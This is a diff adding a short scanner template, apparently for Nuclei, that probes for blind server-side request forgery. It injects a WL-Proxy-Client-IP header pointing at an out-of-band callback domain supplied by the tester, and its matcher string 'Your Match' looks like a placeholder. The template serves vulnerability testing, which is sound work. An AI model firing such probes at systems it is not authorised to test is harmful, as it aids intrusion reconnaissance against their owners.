@@ -1,0 +1,23 @@
+id: 0x025
+
+info:
+  name: Blind SSRF
+  author: 0xAwali
+  severity: info
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        WL-Proxy-Client-IP: {{Host}}.{{Port}}.BSSRF-025.{{MY-DOMAIN}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cache-Control: no-transform
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
